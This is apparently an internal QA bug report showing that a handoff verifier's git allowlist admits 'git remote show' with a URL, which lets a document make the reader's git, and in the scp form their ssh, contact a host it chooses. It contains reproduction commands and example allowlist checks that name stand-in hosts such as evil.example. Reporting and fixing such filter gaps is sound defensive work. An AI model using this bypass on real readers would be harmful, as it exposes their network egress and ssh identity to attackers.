# Bug Report: Task 110 - `git remote show <url>` treats an unconfigured name as a URL and queries it

**Task**: [Link](./task.110.session-handoff-skill.md)
**Bug ID**: TASK-110-BUG-13
**Severity**: MEDIUM
**Priority**: P2
**Status**: New
**Found By**: QA Engineer (reviewer CR-1, confirmed by execution)
**Date Found**: 2026-09-15

## Description

`gitRule` admits `git remote show <name>` with `POS.ANY` positionals — the comment beside
`ls-remote` explains why *that* subcommand's positional is anchored ("a handoff must not point the
reader's SSH agent at an arbitrary host — gate 3, PRB-8"), but `remote show` was left on the
unanchored policy. Git resolves a name that is not a configured remote as a URL alias
(`remote.c: add_url_alias`) and then queries it, so the anchor that closed PRB-8 on `ls-remote` is
one subcommand away from being bypassed.

**Executed** (QA cycle 8) through read mode in a scratch clone, against a local listener on
127.0.0.1:8099:

- `git remote show http://127.0.0.1:8099/x.git` → listener received
  `GET /x.git/info/refs?service=git-upload-pack`; line read `command failed (exit 128)`
  (`repository … not found` — the request was made).
- `git remote show 127.0.0.1:8099/x.git` (the scp form) → `ssh: connect to host 127.0.0.1 port 22:
  Connection refused` — git invoked the reader's ssh, with the reader's keys and agent, against a
  host the handoff named.
- `git remote get-url http://…` → `No such remote` (get-url does not alias; unaffected).
- `isAllowed("git remote show git@evil.example:x.git").ok === true`;
  `isAllowed("git remote show https://evil.example/x.git").ok === true`.

## Steps to Reproduce

```bash
printf -- '- x <!-- cmd: git remote show http://127.0.0.1:8099/x.git; expect: /./ -->\n' > /tmp/p.md
command node skills/session-handoff/scripts/handoff-verify.mjs /tmp/p.md --json | jq '.lines[0].measured'
# with a listener on 8099: GET /x.git/info/refs?service=git-upload-pack
```

## Expected Behavior

A `remote show` positional is a configured remote **name** — the same anchor `ls-remote` uses (no
`:`, no `@`, no scheme, no leading `/` or `.`) — or `remote show` is dropped from the arm: `git
remote -v` and `git remote get-url <name>` answer every question a handoff records without a
network round-trip.

## Actual Behavior

Any URL, including the scp form that spawns ssh, is admitted as a "remote name" and contacted.

## Impact

Egress to a host of the document's choosing; the scp form presents the reader's ssh identity to it.
Same class and severity as bug.9 (`gh -R <host>`, `npm view <url>`), through git.

## Recommendation

Apply `ls-remote`'s `positionalPattern` to `remote show` (and `get-url`, for symmetry), or remove
`remote show`; refused-list tests for the http, https and scp spellings; allowed test for `git
remote show origin`.

## Status History

| Date       | Status | Changed By  | Notes                                                                                             |
| ---------- | ------ | ----------- | ------------------------------------------------------------------------------------------------- |
| 2026-09-15 | New    | QA Engineer | QA cycle 8 — reviewer CR-1; executed: http form reached the listener, scp form invoked ssh        |
